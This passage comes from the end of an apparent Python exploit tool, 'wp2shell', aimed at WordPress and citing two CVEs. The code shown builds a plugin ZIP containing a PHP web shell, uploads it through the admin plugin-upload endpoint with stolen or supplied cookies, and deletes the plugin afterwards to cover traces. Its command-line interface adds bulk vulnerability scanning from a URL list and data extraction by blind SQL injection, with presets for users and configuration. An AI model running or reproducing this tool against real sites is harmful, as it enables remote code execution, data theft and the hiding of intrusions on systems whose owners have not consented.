    print(f"\n  {G}[+]{RST} Shell URL: {G}{shell_url}{RST}")
    print(f"  {G}[+]{RST} Usage    : {shell_url}&cmd=id")
    print(f"  {Y}[!]{RST} Token ({token[:8]}...) is hidden in URL. Keep it secret.")


def _create_plugin_zip(slug: str, php_code: str) -> bytes:
    """Create an in-memory plugin ZIP file."""
    import io, zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{slug}/oneshot.php" if "WP2Shell OneShot" in php_code
                    else f"{slug}/shell.php", php_code)
        zf.writestr(f"{slug}/index.php", "<?php // Silence is golden.")
    buf.seek(0)
    return buf.read()


def _upload_plugin(target: str, cookie_str: str, slug: str, zip_data: bytes, nonce: str = "") -> bool:
    """Upload a plugin via WordPress plugin upload API."""
    import random as _r
    boundary = "----wp2shell" + "".join(_r.choices("0123456789abcdef", k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n{nonce}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="pluginzip"; filename="{slug}.zip"\r\n'
        f"Content-Type: application/zip\r\n\r\n"
    ).encode() + zip_data + f"\r\n--{boundary}--\r\n".encode()

    try:
        result = _http_post(
            f"{target}/wp-admin/update.php?action=upload-plugin",
            data=body,
            ua="wp2shell/1.0",
            content_type=f"multipart/form-data; boundary={boundary}",
            cookies=_parse_cookies(cookie_str),
            timeout=60,
        )
        # Success response is typically 200 with redirect HTML, not 403
        return result["status"] in (200, 302)
    except Exception:
        return False


def _delete_plugin(target: str, cookie_str: str, slug: str) -> None:
    """Delete a plugin via WordPress admin (best-effort)."""
    import re as _re
    try:
        cj = _parse_cookies(cookie_str)
        # Get plugins page
        result = _http_get(f"{target}/wp-admin/plugins.php",
                           ua="wp2shell/1.0", timeout=30)
        body_text = result["body"]
        new_cookies = result.get("cookies", {})
        cj.update(new_cookies)

        # Find delete nonce
        m = _re.search(
            rf'plugins\.php\?action=delete-selected[^"]*_wpnonce=([a-f0-9]+)',
            body_text,
        )
        if not m:
            return
        nonce = m.group(1)

        # Delete plugin
        del_url = (
            f"{target}/wp-admin/plugins.php?action=delete-selected"
            f"&checked%5B0%5D={slug}%2Foneshot.php"
            f"&_wpnonce={nonce}"
        )
        _http_post(del_url, data=b"", ua="wp2shell/1.0", cookies=cj, timeout=30)
    except Exception:
        pass  # best-effort


def _parse_cookies(cookie_str: str) -> dict:
    """Parse 'k1=v1; k2=v2' string into dict."""
    result = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            result[k.strip()] = v.strip()
    return result


# ── Export helpers ──────────────────────────────────────────────
def _export(result: Optional[dict], path: Optional[str], cmd: str) -> None:
    """Export results to JSON, CSV, or TXT file based on extension."""
    if not path or not result:
        return

    ext = os.path.splitext(path)[1].lower()
    try:
        if ext == ".json":
            with open(path, "w", encoding="utf-8") as f:
                json.dump(result, f, indent=2, default=str, ensure_ascii=False)
            print(f"\n  {G}[+]{RST} Exported JSON -> {path}")

        elif ext == ".csv":
            if isinstance(result, list):
                # Bulk mode: each item is a scan result dict
                rows = []
                for r in result:
                    rows.extend(_flatten_for_csv(r, cmd))
            else:
                rows = _flatten_for_csv(result, cmd)
            if rows:
                with open(path, "w", encoding="utf-8", newline="") as f:
                    w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
                    w.writeheader()
                    w.writerows(rows)
                print(f"\n  {G}[+]{RST} Exported CSV ({len(rows)} rows) -> {path}")
            else:
                warn(f"Nothing to export as CSV for this command.")

        else:  # .txt or other
            with open(path, "w", encoding="utf-8") as f:
                json.dump(result, f, indent=2, default=str, ensure_ascii=False)
            print(f"\n  {G}[+]{RST} Exported -> {path}")

    except OSError as e:
        fail(f"Cannot write {path}: {e}")


def _flatten_for_csv(result: dict, cmd: str) -> list[dict]:
    """Convert nested result dict into flat CSV rows."""
    rows = []
    if cmd == "scan" or cmd == "bulk":
        rows.append({
            "target": result.get("target", ""),
            "version": result.get("version", {}).get("version", ""),
            "version_affected": result.get("version", {}).get("affected", ""),
            "route_confusion": result.get("route_confusion", {}).get("detected", ""),
            "sqli_confirmed": result.get("sqli", {}).get("confirmed", ""),
            "sqli_delta": result.get("sqli", {}).get("delta", ""),
            "vulnerable": result.get("vulnerable", ""),
        })
    elif cmd == "read":
        for item in result.get("items", []):
            row = {"target": result.get("target", ""), "preset": result.get("preset", "")}
            row.update(item)
            rows.append(row)
    return rows


# ── CLI ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="wp2shell — CVE-2026-63030 + CVE-2026-60137 | author: dinhvaren",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
    examples:
  wp2shell.py -t http://127.0.0.1:8081 scan
  wp2shell.py -t http://127.0.0.1:8081 scan --sleep 2 -o results.json
  wp2shell.py -t http://127.0.0.1:8081 read --preset users -o users.csv
  wp2shell.py -t http://127.0.0.1:8081 read --preset fingerprint -o fingerprint.json
  wp2shell.py -t http://127.0.0.1:8081 read --query "SELECT VERSION()" -o result.txt
  wp2shell.py -l targets.txt scan -o report.csv
  wp2shell.py -l targets.txt scan --sleep 2 --rounds 2
""")
    parser.add_argument("-t", "--target", help="WordPress base URL")
    parser.add_argument("-l", "--list", help="File with list of URLs to scan (one per line)")
    parser.add_argument("--timeout", type=float, default=30.0, help="HTTP timeout (default: 30s)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--ua", default="wp2shell/1.0 (dinhvaren)", help="User-Agent")
    parser.add_argument("-o", "--output", help="Export results to file (.json / .csv / .txt)")
    parser.add_argument("-d", "--debug", action="store_true", help="Show raw HTTP request/response")

    sub = parser.add_subparsers(dest="command", help="Sub-command")

    scn = sub.add_parser("scan", help="Scan target for wp2shell vulnerability")
    scn.add_argument("--sleep", type=float, default=3.0, help="Sleep seconds for SQLi timing (0 = skip SQLi)")
    scn.add_argument("--rounds", type=int, default=3, help="Timing rounds (default: 3)")
    scn.add_argument("--quick", action="store_true", help="Skip SQLi confirmation (version + confusion only)")

    rd = sub.add_parser("read", help="Extract data via blind SQLi")
    rd.add_argument("--preset", choices=["users", "fingerprint", "config"],
                    help="Extraction preset")
    rd.add_argument("--query", help="Raw SQL expression to extract")
    rd.add_argument("--sleep", type=float, default=1.0, help="Sleep seconds for SQLi confirm (default: 1)")
    rd.add_argument("--max-length", type=int, default=128, help="Max chars to extract")
    rd.add_argument("--no-confirm", action="store_true",
                    help="Skip SLEEP confirmation (use if already scanned)")

    sh = sub.add_parser("shell", help="Post-auth shell via admin plugin upload (requires creds)")
    sh.add_argument("-u", "--user", default="admin", help="WordPress admin username")
    sh.add_argument("-p", "--password", help="WordPress admin password")
    sh.add_argument("-c", "--cmd", help="One-shot command to execute")

    args = parser.parse_args()

    # Bulk scan mode: read URLs from file
    if args.list:
        if not os.path.isfile(args.list):
            print(f"  {R}[-]{RST} File not found: {args.list}")
            sys.exit(1)
        with open(args.list, "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
        if not urls:
            print(f"  {R}[-]{RST} No URLs found in {args.list}")
            sys.exit(1)

        show_banner()
        print(f"  {DIM}Bulk scan: {len(urls)} targets from {args.list}{RST}")
        print(f"  {DIM}Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}{RST}\n")

        all_results = []
        for i, url in enumerate(urls, 1):
            if not url.startswith("http"):
                url = "http://" + url
            url = url.rstrip("/")
            print(f"  {C}[{i}/{len(urls)}]{RST} {url}")
            try:
                r = cmd_check(url, args)
                r["_index"] = i
                all_results.append(r)
            except Exception as e:
                all_results.append({"target": url, "vulnerable": False, "error": str(e), "_index": i})
                print(f"  {R}[-]{RST} Error: {e}")
            print()

        # Summary
        vuln_count = sum(1 for r in all_results if r.get("vulnerable"))
        print(f"  {C}── Summary ──{RST}")
        print(f"  Total      : {len(all_results)}")
        print(f"  {R}Vulnerable : {vuln_count}{RST}")
        print(f"  {G}Safe       : {len(all_results) - vuln_count}{RST}")

        if args.output:
            _export(all_results, args.output, "bulk")
        return

    # Single target mode
    if not args.target:
        parser.print_help()
        sys.exit(1)

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    show_banner()

    print(f"  {DIM}Target : {target}{RST}")
    print(f"  {DIM}Time   : {time.strftime('%Y-%m-%d %H:%M:%S')}{RST}")

    cmd = args.command or "scan"
    if cmd == "scan":
        result = cmd_check(target, args)
        _export(result, args.output, cmd)
    elif cmd == "read":
        result = cmd_read(target, args)
        if result:
            _export(result, args.output, cmd)
    elif cmd == "shell":
        cmd_shell(target, args)
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)


if __name__ == "__main__":
    main()
